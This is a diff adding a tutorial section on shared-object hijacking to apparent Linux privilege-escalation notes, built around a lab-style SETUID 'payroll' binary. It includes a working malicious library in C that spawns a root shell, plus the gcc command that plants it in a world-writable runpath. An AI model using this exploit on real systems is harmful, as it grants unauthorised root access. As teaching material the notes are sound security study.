@@ -2083,3 +2083,118 @@ uid=0(root) gid=0(root) groups=0(root)
 > This technique leverages LD_PRELOAD to gain root shell access by injecting a custom shared library.
 
 ---
+
+# Shared Object Hijacking
+
+## 🧩 What Are Shared Libraries?
+
+In Linux, programs often rely on **shared libraries** to perform common tasks. These libraries contain reusable code, so developers don’t have to rewrite the same functions over and over.
+
+There are two types:
+- **Static libraries** (`.a`): permanently built into the program.
+- **Shared (dynamic) libraries** (`.so`): loaded when the program runs, and can be swapped or hijacked.
+
+## 🔐 What Is a SETUID Binary?
+
+A **SETUID binary** is a special kind of executable file that runs with the permissions of its owner — often **root**. This means if a regular user runs a SETUID binary owned by root, the program executes with **root privileges**.
+
+Example:
+```bash
+-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
+```
+- `rws` → the `s` means SETUID is enabled.
+- `payroll` is a binary owned by root.
+
+## 🔍 Checking Dependencies with `ldd`
+
+To see which shared libraries a binary uses, we run:
+```bash
+ldd payroll
+```
+
+Output:
+```
+libshared.so => /development/libshared.so
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
+```
+
+Here, `libshared.so` is a **custom library** loaded from `/development`.
+
+## ⚠️ Why This Is Dangerous
+
+The `/development` folder is **world-writable**:
+```bash
+drwxrwxrwx  2 root root 4096 Sep  1 22:06 /development/
+```
+
+This means **any user** can place files there. If a binary loads a library from this folder, a malicious user can **replace or inject** their own version of the library.
+
+## 🧪 How the Binary Chooses Libraries
+
+Using `readelf`, we can inspect the binary’s configuration:
+```bash
+readelf -d payroll | grep PATH
+```
+
+Output:
+```
+Library runpath: [/development]
+```
+
+This tells us the binary **prefers** libraries from `/development` over system ones. So if we place a fake `libshared.so` there, the binary will use it.
+
+
+## 🧨 Exploiting the Vulnerability
+
+### Step 1: Identify the Missing Function
+
+Run the binary:
+```bash
+./payroll
+```
+
+Error:
+```
+symbol lookup error: undefined symbol: dbquery
+```
+
+This means the binary expects a function called `dbquery` inside `libshared.so`.
+
+### Step 2: Create a Malicious Library
+
+Write a C file that defines `dbquery` and gives us a root shell:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void dbquery() {
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+```
+
+Compile it as a shared object:
+```bash
+gcc -fPIC -shared -o /development/libshared.so dbquery.c
+```
+
+- `-fPIC`: generates position-independent code.
+- `-shared`: creates a shared library.
+- `-o`: names the output file.
+
+---
+
+### Step 3: Run the Vulnerable Binary
+
+Now execute the binary again:
+```bash
+./payroll
+```
+
+Since it loads our malicious `libshared.so`, it will call `dbquery()` — which gives us a **root shell**.
+
+---
+
